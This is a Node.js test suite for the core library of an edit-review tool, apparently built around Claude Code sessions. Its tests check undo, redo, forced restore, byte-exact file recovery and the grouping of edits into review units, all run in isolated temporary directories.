/* Core correctness tests — run with `node --test`. Uses isolated temp HOME dirs; never touches
   the real ~/.claude. Requires the built dist (npm test builds first). */
const { test } = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const cp = require('child_process');

const core = require('../dist/index.js');
// The terminal app is its own package now — a front end, like the two editor extensions —
// so its frame, layout, glyphs, key decoder and options screen come from there, not from core.
const tui = require('../../tui/dist/index.js');
const CAPTURE = path.resolve(__dirname, '../../cli/dist/capture.js');
const CLI = path.resolve(__dirname, '../../cli/dist/index.js');

function freshHome() {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-home-'));
  process.env.HOME = home;
  process.env.USERPROFILE = home; // os.homedir() reads USERPROFILE on Windows, HOME elsewhere
  return home;
}
function tmpWork() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'cc-work-'));
}
function seedEdit(session, file, before, after) {
  core.ensureStore(session);
  const b = before === null ? null : core.writeBlob(session, Buffer.from(before));
  const a = after === null ? null : core.writeBlob(session, Buffer.from(after));
  const id = core.nextId(session);
  core.appendLog(session, { id, ts: id * 1000, tool: 'Edit', file, beforeBlob: b, afterBlob: a, status: 'pending' });
  return id;
}

test('store: writeBlob dedupes identical content', () => {
  freshHome();
  const S = 'dedupe';
  core.ensureStore(S);
  const a = core.writeBlob(S, Buffer.from('same bytes'));
  const b = core.writeBlob(S, Buffer.from('same bytes'));
  assert.equal(a, b);
  assert.equal(fs.readdirSync(path.join(core.storeDir(S), 'blobs')).length, 1);
});

test('store: nextId increments and setStatus flips one record', () => {
  freshHome();
  const S = 'ids';
  const F = path.join(tmpWork(), 'f.txt');
  const id1 = seedEdit(S, F, 'a\n', 'b\n');
  const id2 = seedEdit(S, F, 'b\n', 'c\n');
  assert.equal(id1, 1);
  assert.equal(id2, 2);
  core.setStatus(S, 1, 'kept');
  assert.equal(core.findRecord(S, 1).status, 'kept');
  assert.equal(core.findRecord(S, 2).status, 'pending');
});

test('undo: surgical undo preserves later edits to the same file', () => {
  freshHome();
  const S = 'surgical';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'L1\nL2\nL3\nL4\n', 'TOP\nL2\nL3\nL4\n'); // #1 top
  seedEdit(S, F, 'TOP\nL2\nL3\nL4\n', 'TOP\nL2\nL3\nBOT\n'); // #2 bottom
  fs.writeFileSync(F, 'TOP\nL2\nL3\nBOT\n'); // both applied on disk
  const r = core.undoEdit(S, 1);
  assert.equal(r.status, 'undone');
  const now = fs.readFileSync(F, 'utf8');
  assert.ok(now.startsWith('L1\n'), 'top reverted');
  assert.ok(now.includes('BOT'), 'bottom preserved');
  assert.equal(core.findRecord(S, 1).status, 'undone');
});

test('undo: duplicated-block scenario is NOT silently corrupted (position-anchored merge)', () => {
  // Regression for the fuzzy-patch corruption: two identical blocks, a later edit disturbs the TOP
  // block's context. Undoing edit #1 must revert the TOP block and leave the identical BOTTOM block
  // untouched — a content-searching patch would revert the wrong block and report success.
  freshHome();
  const S = 'dup';
  const F = path.join(tmpWork(), 'dup.js');
  const before1 = 'ctx-a\nctx-b\nVALUE_ORIG\nctx-c\nctx-d\nfiller\nctx-a\nctx-b\nVALUE_MOD\nctx-c\nctx-d\n';
  const after1 = 'ctx-a\nctx-b\nVALUE_MOD\nctx-c\nctx-d\nfiller\nctx-a\nctx-b\nVALUE_MOD\nctx-c\nctx-d\n'; // #1: L3 ORIG->MOD
  const current = 'ctx-a\nctx-b-EDIT\nVALUE_MOD\nctx-c\nctx-d\nfiller\nctx-a\nctx-b\nVALUE_MOD\nctx-c\nctx-d\n'; // #2: L2 disturbed
  seedEdit(S, F, before1, after1); // #1 (the one we undo)
  seedEdit(S, F, after1, current); // #2 (later edit)
  fs.writeFileSync(F, current);
  const r = core.undoEdit(S, 1);
  assert.equal(r.status, 'undone');
  const lines = fs.readFileSync(F, 'utf8').split('\n');
  assert.equal(lines[2], 'VALUE_ORIG', 'TOP block correctly reverted');
  assert.equal(lines[8], 'VALUE_MOD', 'BOTTOM (identical) block untouched — no corruption');
  assert.equal(lines[1], 'ctx-b-EDIT', 'later edit #2 preserved');
});

test('undo: adjacent later edit (gap=1) still undoes cleanly (no false conflict)', () => {
  freshHome();
  const S = 'adjacent';
  const F = path.join(tmpWork(), 'adj.txt');
  seedEdit(S, F, 'a\nb\nc\nd\ne\n', 'a\nX\nc\nd\ne\n'); // #1: b->X (line 2)
  seedEdit(S, F, 'a\nX\nc\nd\ne\n', 'a\nX\nY\nd\ne\n'); // #2: c->Y (line 3, adjacent)
  fs.writeFileSync(F, 'a\nX\nY\nd\ne\n');
  const r = core.undoEdit(S, 1);
  assert.equal(r.status, 'undone');
  assert.equal(fs.readFileSync(F, 'utf8'), 'a\nb\nY\nd\ne\n', 'X->b undone, adjacent Y preserved');
});

test('undo: middle of three spaced edits merges cleanly (no false conflict)', () => {
  // Guards against a patch-level merge that spuriously conflicts when edits are within a few lines.
  freshHome();
  const S = 'spaced';
  const F = path.join(tmpWork(), 'spaced.txt');
  const orig = 'L1\nL2\nL3\nL4\nL5\nL6\nL7\nL8\nL9\nL10\nL11\nL12\n';
  seedEdit(S, F, orig, 'TOP\nL2\nL3\nL4\nL5\nL6\nL7\nL8\nL9\nL10\nL11\nL12\n'); // #1 line1
  seedEdit(S, F, 'TOP\nL2\nL3\nL4\nL5\nL6\nL7\nL8\nL9\nL10\nL11\nL12\n', 'TOP\nL2\nL3\nL4\nL5\nMID\nL7\nL8\nL9\nL10\nL11\nL12\n'); // #2 line6
  seedEdit(S, F, 'TOP\nL2\nL3\nL4\nL5\nMID\nL7\nL8\nL9\nL10\nL11\nL12\n', 'TOP\nL2\nL3\nL4\nL5\nMID\nL7\nL8\nL9\nL10\nL11\nBOT\n'); // #3 line12
  fs.writeFileSync(F, 'TOP\nL2\nL3\nL4\nL5\nMID\nL7\nL8\nL9\nL10\nL11\nBOT\n');
  const r = core.undoEdit(S, 2); // undo the MIDDLE edit
  assert.equal(r.status, 'undone');
  assert.equal(
    fs.readFileSync(F, 'utf8'),
    'TOP\nL2\nL3\nL4\nL5\nL6\nL7\nL8\nL9\nL10\nL11\nBOT\n',
    'MID reverted to L6, TOP + BOT preserved'
  );
});

test('undo: overlapping edit conflicts; --force per-file restore recovers', () => {
  freshHome();
  const S = 'conflict';
  const F = path.join(tmpWork(), 'c.txt');
  seedEdit(S, F, 'A\nB\nC\n', 'A\nX\nC\n'); // #1 B->X
  seedEdit(S, F, 'A\nX\nC\n', 'A\nY\nC\n'); // #2 X->Y overlaps #1
  fs.writeFileSync(F, 'A\nY\nC\n');
  const r = core.undoEdit(S, 1);
  assert.equal(r.status, 'conflict');
  assert.equal(fs.readFileSync(F, 'utf8'), 'A\nY\nC\n', 'file untouched on conflict');
  const r2 = core.restoreFile(S, 1);
  assert.equal(r2.status, 'undone');
  assert.equal(fs.readFileSync(F, 'utf8'), 'A\nB\nC\n', 'restored to pre-edit-1 state');
});

test('undo --force: restoreFile marks dropped later same-file edits undone; other files untouched', () => {
  // Regression: a --force restore drops later edits to the same file from disk. Those edits must be
  // marked `undone` so recorded status matches disk (a pending/kept edit whose change is gone lies to
  // the tree and makes a later per-edit undo/redo compute against a mismatched file).
  freshHome();
  const S = 'force-status';
  const F = path.join(tmpWork(), 'c.txt');
  const OTHER = path.join(path.dirname(F), 'other.txt');
  seedEdit(S, F, 'A\nB\nC\n', 'A\nX\nC\n'); // #1 F: B->X
  seedEdit(S, OTHER, 'p\n', 'q\n'); // #2 OTHER (different file, id between #1 and #3)
  seedEdit(S, F, 'A\nX\nC\n', 'A\nY\nC\n'); // #3 F: X->Y overlaps #1
  core.setStatus(S, 3, 'kept'); // the later edit was accepted
  fs.writeFileSync(F, 'A\nY\nC\n');
  fs.writeFileSync(OTHER, 'q\n');
  const r = core.restoreFile(S, 1); // conflict path -> drops #3 (later, same file)
  assert.equal(r.status, 'undone');
  assert.equal(fs.readFileSync(F, 'utf8'), 'A\nB\nC\n', 'F restored to pre-#1');
  assert.equal(core.findRecord(S, 1).status, 'undone', '#1 undone');
  assert.equal(core.findRecord(S, 2).status, 'pending', '#2 (other file) untouched');
  assert.equal(core.findRecord(S, 3).status, 'undone', '#3 dropped from disk -> undone (was kept)');
});

test('redo --force: reapplyFile marks dropped later same-file edits undone', () => {
  freshHome();
  const S = 'force-redo-status';
  const F = path.join(tmpWork(), 'c.txt');
  seedEdit(S, F, 'A\nB\nC\n', 'A\nX\nC\n'); // #1 F: B->X
  seedEdit(S, F, 'A\nX\nC\n', 'A\nY\nC\n'); // #2 F: X->Y (later)
  core.setStatus(S, 1, 'undone'); // #1 previously undone
  core.setStatus(S, 2, 'kept'); // #2 accepted, still on disk
  fs.writeFileSync(F, 'A\nY\nC\n');
  const r = core.reapplyFile(S, 1); // force redo #1 -> writes after_#1 wholesale, drops #2
  assert.equal(r.status, 'redone');
  assert.equal(fs.readFileSync(F, 'utf8'), 'A\nX\nC\n', 'file = after-edit-1 (later edit dropped)');
  assert.equal(core.findRecord(S, 1).status, 'pending', '#1 re-applied -> pending');
  assert.equal(core.findRecord(S, 2).status, 'undone', '#2 dropped from disk -> undone (was kept)');
});

test('undoScope: reverts pending only, honoring under / fileSubstr / whole-session', () => {
  // The single scoped-revert implementation behind CLI `undo --all|--file|--under` and the editors'
  // folder/file/session Revert. Accepted (kept) edits are never swept; a sibling folder is never swept.
  freshHome();
  const S = 'scope';
  const dir = tmpWork();
  const A = path.join(dir, 'pkg', 'a.txt');
  const B = path.join(dir, 'pkg', 'sub', 'b.txt');
  const C = path.join(dir, 'other', 'c.txt');
  seedEdit(S, A, 'a1\n', 'a2\n'); // #1 pending, under pkg/
  seedEdit(S, B, 'b1\n', 'b2\n'); // #2 pending, under pkg/sub/
  seedEdit(S, C, 'c1\n', 'c2\n'); // #3 pending, under other/
  core.setStatus(S, 2, 'kept'); // #2 accepted -> excluded from every scope
  for (const [f, v] of [[A, 'a2\n'], [B, 'b2\n'], [C, 'c2\n']]) {
    fs.mkdirSync(path.dirname(f), { recursive: true });
    fs.writeFileSync(f, v);
  }
  // Folder scope pkg/: only #1 is pending under it (#2 is kept); #3 is a sibling folder.
  const r1 = core.undoScope(S, { under: path.join(dir, 'pkg') });
  assert.deepEqual([r1.undone, r1.total], [1, 1], 'pkg/ scope reverts only the 1 pending edit under it');
  assert.equal(fs.readFileSync(A, 'utf8'), 'a1\n', 'A reverted');
  assert.equal(core.findRecord(S, 2).status, 'kept', 'accepted #2 left kept + on disk');
  assert.equal(fs.readFileSync(C, 'utf8'), 'c2\n', 'C (sibling folder) untouched');
  // fileSubstr scope: matches c.txt only.
  const r2 = core.undoScope(S, { fileSubstr: 'c.txt' });
  assert.deepEqual([r2.undone, r2.total], [1, 1], 'fileSubstr reverts the matching pending edit');
  assert.equal(fs.readFileSync(C, 'utf8'), 'c1\n', 'C reverted by fileSubstr');
  // Whole session: nothing pending remains (#1,#3 undone; #2 kept).
  const r3 = core.undoScope(S);
  assert.deepEqual([r3.undone, r3.total], [0, 0], 'no pending left session-wide');
});

test('undo: new-file create is deleted; second undo is a noop', () => {
  freshHome();
  const S = 'newfile';
  const F = path.join(tmpWork(), 'new.txt');
  fs.writeFileSync(F, 'hello\n');
  seedEdit(S, F, null, 'hello\n'); // beforeBlob null = created
  const r = core.undoEdit(S, 1);
  assert.equal(r.status, 'deleted');
  assert.ok(!fs.existsSync(F));
  assert.equal(core.undoEdit(S, 1).status, 'noop');
});

test('undo: create WITH a later edit conflicts (never deletes); --force deletes', () => {
  freshHome();
  const S = 'createlater';
  const F = path.join(tmpWork(), 'c.txt');
  seedEdit(S, F, null, 'line1\n'); // #1 create
  seedEdit(S, F, 'line1\n', 'line1\nline2\n'); // #2 append
  fs.writeFileSync(F, 'line1\nline2\n'); // both applied on disk
  const r = core.undoEdit(S, 1);
  assert.equal(r.status, 'conflict', 'must NOT silently delete the file + edit #2');
  assert.ok(fs.existsSync(F), 'file preserved on conflict');
  assert.equal(fs.readFileSync(F, 'utf8'), 'line1\nline2\n');
  assert.equal(core.restoreFile(S, 1).status, 'deleted');
  assert.ok(!fs.existsSync(F));
});

// Seed one edit from raw before/after Buffers (bypasses seedEdit's Buffer.from(string)).
function seedEditBytes(session, file, beforeBuf, afterBuf) {
  core.ensureStore(session);
  const b = beforeBuf === null ? null : core.writeBlob(session, beforeBuf);
  const a = afterBuf === null ? null : core.writeBlob(session, afterBuf);
  const id = core.nextId(session);
  core.appendLog(session, { id, ts: id * 1000, tool: 'Edit', file, beforeBlob: b, afterBlob: a, status: 'pending' });
  return id;
}

test('undo: clean revert preserves EXACT bytes of a non-UTF-8 file (no UTF-8 round-trip)', () => {
  freshHome();
  const S = 'bytes';
  const F = path.join(tmpWork(), 'latin1.txt');
  const before = Buffer.from([0x63, 0x61, 0x66, 0xe9, 0x0a]); // "caf<0xE9>\n" — 0xE9 is invalid standalone UTF-8
  const after = Buffer.from([0x63, 0x61, 0x66, 0xe9, 0x21, 0x0a]); // + "!"
  const id = seedEditBytes(S, F, before, after);
  fs.writeFileSync(F, after); // file currently at "after" (clean-revert path: current === after)
  const r = core.undoEdit(S, id);
  assert.equal(r.status, 'undone');
  assert.equal(Buffer.compare(fs.readFileSync(F), before), 0, 'restored to exact before-bytes, not U+FFFD');
});

test('redo: clean re-apply preserves EXACT bytes of a non-UTF-8 file', () => {
  freshHome();
  const S = 'bytes2';
  const F = path.join(tmpWork(), 'latin1.txt');
  const before = Buffer.from([0x63, 0x61, 0x66, 0xe9, 0x0a]);
  const after = Buffer.from([0x63, 0x61, 0x66, 0xe9, 0x21, 0x0a]);
  const id = seedEditBytes(S, F, before, after);
  fs.writeFileSync(F, after);
  core.undoEdit(S, id); // now at `before` (byte-exact, tested above)
  assert.equal(Buffer.compare(fs.readFileSync(F), before), 0);
  const r = core.redoEdit(S, id);
  assert.equal(r.status, 'redone');
  assert.equal(Buffer.compare(fs.readFileSync(F), after), 0, 're-applied to exact after-bytes');
});

test('undo: --force restore of a deleted non-UTF-8 file preserves exact bytes', () => {
  freshHome();
  const S = 'bytes3';
  const F = path.join(tmpWork(), 'bin.txt');
  const before = Buffer.from([0x80, 0x81, 0x82, 0x0a]); // high bytes, invalid UTF-8
  const id = seedEditBytes(S, F, before, null); // edit deleted the file
  // file is absent now (after === null); undo restores it
  const r = core.undoEdit(S, id);
  assert.equal(r.status, 'undone');
  assert.equal(Buffer.compare(fs.readFileSync(F), before), 0, 'deleted file restored byte-exact');
});

test('groups: consecutive same-line edits collapse into one review unit (keep the latest)', () => {
  freshHome();
  const S = 'grp';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'L1\nA\nL3\n', 'L1\nB\nL3\n'); // #1: line 2 A->B
  seedEdit(S, F, 'L1\nB\nL3\n', 'L1\nC\nL3\n'); // #2: line 2 B->C (chained; #1's "B" is superseded)
  const groups = core.pendingGroups(S);
  assert.equal(groups.size, 1, 'the two same-line edits collapse into ONE group');
  const [rep, members] = [...groups.entries()][0];
  assert.equal(rep, 2, 'represented by the most-recent edit');
  assert.deepEqual(members, [1, 2]);
  assert.deepEqual(core.groupMembers(S, 1), [1, 2], 'membership resolves from either id');
});

test('groups: edits to different regions of a file stay separate', () => {
  freshHome();
  const S = 'grp2';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'L1\nL2\nL3\nL4\nL5\n', 'X1\nL2\nL3\nL4\nL5\n'); // #1: line 1
  seedEdit(S, F, 'X1\nL2\nL3\nL4\nL5\n', 'X1\nL2\nL3\nL4\nX5\n'); // #2: line 5 (chained, non-overlapping)
  assert.equal(core.pendingGroups(S).size, 2, 'different regions -> two independent groups');
  assert.deepEqual(core.groupMembers(S, 1), [1]);
  assert.deepEqual(core.groupMembers(S, 2), [2]);
});

test('groups: undoGroup reverts to the earliest before; redoGroup rebuilds; keepGroup keeps all', () => {
  freshHome();
  const S = 'grp3';
  const F = path.join(tmpWork(), 'f.txt');
  const A = 'L1\nA\nL3\n', B = 'L1\nB\nL3\n', C = 'L1\nC\nL3\n';
  seedEdit(S, F, A, B); // #1
  seedEdit(S, F, B, C); // #2
  fs.writeFileSync(F, C); // current on disk = the latest state
  const u = core.undoGroup(S, 2);
  assert.equal(u.status, 'undone');
  assert.deepEqual([...u.ids].sort((a, b) => a - b), [1, 2]);
  assert.equal(fs.readFileSync(F, 'utf8'), A, 'reverted the whole chain back to the earliest before-state');
  assert.equal(core.findRecord(S, 1).status, 'undone');
  assert.equal(core.findRecord(S, 2).status, 'undone');
  const r = core.redoGroup(S, 2);
  assert.equal(r.status, 'redone');
  assert.equal(fs.readFileSync(F, 'utf8'), C, 're-applied the whole chain');
  const k = core.keepGroup(S, 1);
  assert.equal(k.kept, 2, 'keepGroup keeps every member');
  assert.equal(core.findRecord(S, 1).status, 'kept');
  assert.equal(core.findRecord(S, 2).status, 'kept');
});

test('groups: a three-edit chain on the same line collapses transitively into one unit', () => {
  freshHome();
  const S = 'g4';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'x\nA\ny\n', 'x\nB\ny\n'); // #1
  seedEdit(S, F, 'x\nB\ny\n', 'x\nC\ny\n'); // #2
  seedEdit(S, F, 'x\nC\ny\n', 'x\nD\ny\n'); // #3
  const g = core.pendingGroups(S);
  assert.equal(g.size, 1, 'all three collapse');
  assert.deepEqual([...g.get(3)], [1, 2, 3], 'rep is #3; members are 1-3');
});

test('groups: same-line edits group while a different-region edit stays a separate unit', () => {
  freshHome();
  const S = 'g5';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'L0\nL1\nL2\nL3\nL4\n', 'A\nL1\nL2\nL3\nL4\n'); // #1 line 0
  seedEdit(S, F, 'A\nL1\nL2\nL3\nL4\n', 'B\nL1\nL2\nL3\nL4\n'); // #2 line 0 (groups with #1)
  seedEdit(S, F, 'B\nL1\nL2\nL3\nL4\n', 'B\nL1\nL2\nL3\nX\n'); // #3 line 4 (separate region)
  assert.equal(core.pendingGroups(S).size, 2, 'two independent groups');
  assert.deepEqual(core.groupMembers(S, 1), [1, 2]);
  assert.deepEqual(core.groupMembers(S, 3), [3]);
});

test('groups: undoGroup reverts its region ONLY, surgically preserving an unrelated edit in the same file', () => {
  freshHome();
  const S = 'g6';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'L0\nL1\nL2\nL3\nL4\n', 'A\nL1\nL2\nL3\nL4\n'); // #1 line 0
  seedEdit(S, F, 'A\nL1\nL2\nL3\nL4\n', 'B\nL1\nL2\nL3\nL4\n'); // #2 line 0 (group)
  seedEdit(S, F, 'B\nL1\nL2\nL3\nL4\n', 'B\nL1\nL2\nL3\nX\n'); // #3 line 4 (separate)
  fs.writeFileSync(F, 'B\nL1\nL2\nL3\nX\n');
  const res = core.undoGroup(S, 2);
  assert.equal(res.status, 'undone');
  assert.equal(fs.readFileSync(F, 'utf8'), 'L0\nL1\nL2\nL3\nX\n', 'line 0 reverted; line 4 (#3) preserved');
  assert.equal(core.findRecord(S, 3).status, 'pending', 'the unrelated edit is untouched');
});

test('groups: a resolved (kept) edit never drags into a later pending same-line group', () => {
  freshHome();
  const S = 'g7';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'x\nA\ny\n', 'x\nB\ny\n'); // #1
  core.setStatus(S, 1, 'kept'); // resolve #1
  seedEdit(S, F, 'x\nB\ny\n', 'x\nC\ny\n'); // #2 pending (chained after #1)
  assert.deepEqual(core.groupMembers(S, 2), [2], 'only the pending edit is in the group');
  assert.equal(core.keepGroup(S, 2).kept, 1);
  assert.equal(core.findRecord(S, 1).status, 'kept', 'the already-kept edit is unchanged');
});

test('groups: a new-file create + an immediate same-line edit collapse (before=null chain)', () => {
  freshHome();
  const S = 'g8';
  const F = path.join(tmpWork(), 'new.txt');
  seedEdit(S, F, null, 'hello\n'); // #1 create
  seedEdit(S, F, 'hello\n', 'HELLO\n'); // #2 edit
  assert.equal(core.pendingGroups(S).size, 1, 'create + edit collapse');
  assert.deepEqual(core.groupMembers(S, 1), [1, 2]);
  fs.writeFileSync(F, 'HELLO\n');
  const res = core.undoGroup(S, 2);
  assert.ok(res.ok, 'undoing the whole unit succeeds');
  assert.ok(!fs.existsSync(F), 'reverting the group removes the created file');
});

test('groups: undoGroup then redoGroup round-trips to the exact final state', () => {
  freshHome();
  const S = 'g9';
  const F = path.join(tmpWork(), 'f.txt');
  const A = 'p\nA\nq\n', B = 'p\nB\nq\n', C = 'p\nC\nq\n';
  seedEdit(S, F, A, B);
  seedEdit(S, F, B, C);
  fs.writeFileSync(F, C);
  core.undoGroup(S, 2);
  assert.equal(fs.readFileSync(F, 'utf8'), A, 'undo -> earliest before');
  core.redoGroup(S, 2);
  assert.equal(fs.readFileSync(F, 'utf8'), C, 'redo -> exact final state');
  assert.equal(core.findRecord(S, 1).status, 'pending');
  assert.equal(core.findRecord(S, 2).status, 'pending');
});

test('groups: identical edits to two different files never group across files', () => {
  freshHome();
  const S = 'g10';
  const dir = tmpWork();
  seedEdit(S, path.join(dir, 'a.txt'), 'x\n', 'y\n'); // #1 file A
  seedEdit(S, path.join(dir, 'b.txt'), 'x\n', 'y\n'); // #2 file B
  assert.equal(core.pendingGroups(S).size, 2, 'different files -> different groups');
});

test('groups: reviewEdits collapses pending to one net rep (earliest before -> latest after)', () => {
  freshHome();
  const S = 'g11';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'a\nX\nb\n', 'a\nY\nb\n'); // #1 line 1
  seedEdit(S, F, 'a\nY\nb\n', 'a\nZ\nb\n'); // #2 line 1 (group)
  const rev = core.reviewEdits(S);
  assert.equal(rev.length, 1, 'one collapsed review record');
  assert.equal(rev[0].id, 2, 'rep carries the most-recent id');
  const d = core.lineDelta(S, rev[0]);
  assert.equal(d.added, 1, 'net delta is earliest-before -> latest-after (X -> Z)');
  assert.equal(d.removed, 1);
  // resolved edits stay individual (history) alongside a new pending rep
  core.setStatus(S, 1, 'kept');
  core.setStatus(S, 2, 'kept'); // the group is now resolved
  seedEdit(S, F, 'a\nZ\nb\n', 'a\nW\nb\n'); // #3 pending, chained after the kept group
  const rev2 = core.reviewEdits(S);
  assert.equal(rev2.length, 3, 'both kept edits stay individual; the new pending edit is its own rep');
});

test('groups: a new ask invalidates the unit split without any log write (memo stamps the transcript)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = fs.realpathSync(tmpWork());
  const S = 'askmemo';
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const line = (ts, o) => JSON.stringify({ timestamp: new Date(ts).toISOString(), ...o });
  const T = path.join(proj, S + '.jsonl');
  // One ask before both edits: the chained pair shares its window and collapses to one unit.
  fs.writeFileSync(T, line(500, { type: 'user', message: { role: 'user', content: 'ask one' } }) + '\n');
  const F = path.join(cwd, 'f.txt');
  seedEdit(S, F, 'L1\nA\nL3\n', 'L1\nB\nL3\n'); // #1 ts1000
  seedEdit(S, F, 'L1\nB\nL3\n', 'L1\nC\nL3\n'); // #2 ts2000, chains with #1
  assert.equal(core.pendingGroups(S).size, 1, 'one window, one unit');
  assert.deepEqual(core.groupMembers(S, 2), [1, 2], 'the members index sees the collapse');
  // A second ask lands BETWEEN the two edits' timestamps — a transcript append, no log write. A
  // long-lived host (the extension host, the terminal) must see the split move; a memo keyed on the
  // log alone would serve the stale one-unit answer until the next edit.
  fs.appendFileSync(T, line(1500, { type: 'user', message: { role: 'user', content: 'ask two' } }) + '\n');
  assert.equal(core.pendingGroups(S).size, 2, 'the new ask splits the unit, with no log write between');
  assert.deepEqual(core.groupMembers(S, 2), [2], 'the members index moved with it');
});

test('groups: a moved block — pure delete, then the identical pure insert — is ONE unit', () => {
  freshHome();
  const S = 'mv1';
  const F = path.join(tmpWork(), 'm.txt');
  seedEdit(S, F, 'A\nB\nC\nD\nE\n', 'A\nD\nE\n');       // #1 deletes the B,C block
  seedEdit(S, F, 'A\nD\nE\n', 'A\nD\nB\nC\nE\n');       // #2 re-inserts it lower — a move
  assert.equal(core.pendingGroups(S).size, 1, 'the move is ONE decision');
  assert.deepEqual(core.groupMembers(S, 2), [1, 2]);
  assert.equal(core.reviewEdits(S).length, 1, 'one row: the block moved');
});

test('groups: a move done the other way round — copy in first, delete the original after — also collapses', () => {
  freshHome();
  const S = 'mv2';
  const F = path.join(tmpWork(), 'm.txt');
  seedEdit(S, F, 'A\nB\nC\nD\nE\n', 'A\nB\nC\nD\nB\nC\nE\n'); // #1 pure insert of the copy
  seedEdit(S, F, 'A\nB\nC\nD\nB\nC\nE\n', 'A\nD\nB\nC\nE\n'); // #2 pure delete of the original
  assert.equal(core.pendingGroups(S).size, 1, 'insert-then-delete is the same move');
  assert.deepEqual(core.groupMembers(S, 2), [1, 2]);
});

test('groups: a block moved to EOF still matches — the missing final newline is not a difference', () => {
  freshHome();
  const S = 'mv3';
  const F = path.join(tmpWork(), 'm.txt');
  seedEdit(S, F, 'B\nC\nA\n', 'A\n');                   // #1 deletes "B\nC\n" (terminated)
  seedEdit(S, F, 'A\n', 'A\nB\nC');                     // #2 appends "B\nC" at EOF (unterminated)
  assert.equal(core.pendingGroups(S).size, 1, 'the EOF form of the block is the same block');
});

test('groups: a moved block whose boundary line repeats — the diff attributes a ROTATED window — still collapses', () => {
  freshHome();
  const S = 'mv5';
  const F = path.join(tmpWork(), 'm.ts');
  // Moving the first comment past the second: Myers keeps the FOLLOWING block's identical `/**` as
  // the survivor, so the deletion window is [ONE, */, /**] — a rotation of the real block — while
  // the insertion is the true [/**, ONE, */]. This is the shape every real docblock/function move
  // produces, and exact string equality alone misses it.
  seedEdit(S, F, '/**\nONE\n*/\n/**\nTWO\n*/\nB\n', '/**\nTWO\n*/\nB\n');
  seedEdit(S, F, '/**\nTWO\n*/\nB\n', '/**\nTWO\n*/\nB\n/**\nONE\n*/\n');
  assert.equal(core.pendingGroups(S).size, 1, 'a slid diff window is the same move');
  assert.deepEqual(core.groupMembers(S, 2), [1, 2]);
});

test('groups: a delete beside an UNRELATED insert stays two units — text equality is the whole signal', () => {
  freshHome();
  const S = 'mv4';
  const F = path.join(tmpWork(), 'm.txt');
  seedEdit(S, F, 'A\nB\nC\nD\nE\n', 'A\nD\nE\n');       // #1 deletes B,C
  seedEdit(S, F, 'A\nD\nE\n', 'A\nD\nX\nY\nE\n');       // #2 inserts different text
  assert.equal(core.pendingGroups(S).size, 2, 'different content is two decisions');
});

// A file CREATED in one ask and DELETED in a later one leaves nothing behind, but the two hops land
// in different asks — and a unit never spans two asks. Reported from a real session as two rows for
// one non-change ("+16 −0" then "+0 −16"), which asks the reader to decide twice about nothing.
// seedEdit stamps ts = id*1000, so asks at 500 and 1500 put edit #1 in the first and #2 in the second.
function twoAskStore(session) {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const cwd = fs.realpathSync(tmpWork());
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const ask = (ts, t) => JSON.stringify({ timestamp: new Date(ts).toISOString(), type: 'user', message: { role: 'user', content: t } });
  fs.writeFileSync(path.join(proj, session + '.jsonl'), ask(500, 'ask one') + '\n' + ask(1500, 'ask two') + '\n');
  return path.join(cwd, 'f.txt');
}

test('groups: a file created in one ask and deleted in another is ONE unit — it cancels out', () => {
  const S = 'cancel1';
  const F = twoAskStore(S);
  seedEdit(S, F, null, 'a\nb\nc\n'); // ask 1 creates it
  seedEdit(S, F, 'a\nb\nc\n', null); // ask 2 deletes it — net: nothing
  assert.equal(core.pendingGroups(S).size, 1, 'the create and the delete are one decision');
  assert.deepEqual(core.groupMembers(S, 2), [1, 2], 'both ids stay in the unit — keep/undo act on the pair');
  const rows = core.reviewEdits(S).filter((r) => r.status === 'pending');
  assert.equal(rows.length, 1, 'one row, not two contradictory ones');
  const d = core.lineDelta(S, rows[0]);
  assert.deepEqual([d.added, d.removed], [0, 0], 'and it honestly reads as no net change');
  assert.ok(!fs.existsSync(F), 'the file really is gone');
});

test('groups: an edit reverted by a later ask cancels out too — same rule, same content', () => {
  const S = 'cancel2';
  const F = twoAskStore(S);
  seedEdit(S, F, 'v0\n', 'v1\n');
  seedEdit(S, F, 'v1\n', 'v0\n'); // put back exactly what was there
  assert.equal(core.pendingGroups(S).size, 1, 'a chain that returns to its own start is not a change');
  assert.deepEqual(core.groupMembers(S, 2), [1, 2]);
});

test('groups: a cancelling pair does NOT bridge over resolved records — recordIds stay contiguous', () => {
  // pending #1 (v0→v1) · KEPT #2 (v1→v2) · KEPT #3 (v2→v1) · pending #4 (v1→v0). The blobs meet at
  // v1, so a blob-only chain test merges #1 and #4 across two decisions already made — the very
  // bridge `runsOf` refuses, and it would make a unit's ids non-contiguous.
  const S = 'cancel4';
  const F = twoAskStore(S);
  seedEdit(S, F, 'v0\n', 'v1\n');
  const k2 = seedEdit(S, F, 'v1\n', 'v2\n');
  const k3 = seedEdit(S, F, 'v2\n', 'v1\n');
  seedEdit(S, F, 'v1\n', 'v0\n');
  core.setStatusMany(S, [k2, k3], 'kept');
  assert.equal(core.pendingGroups(S).size, 2, 'a decided record between them breaks the chain');
  assert.deepEqual(core.groupMembers(S, 4), [4], 'and each pending edit stays its own unit');
  assert.equal(core.cancelledGroups(S).size, 0, 'nothing is claimed to cancel out');
});

test('groups: cancelled units are MARKED, so a surface can account for them apart from real work', () => {
  const S = 'cancel5';
  const F = twoAskStore(S);
  seedEdit(S, F, null, 'a\n');
  seedEdit(S, F, 'a\n', null);
  const cancelled = core.cancelledGroups(S);
  assert.deepEqual([...cancelled.keys()], [2], 'keyed by the unit rep, like every other group map');
  assert.deepEqual(cancelled.get(2), [1, 2], 'carrying every member — one Dismiss keeps them all');
});

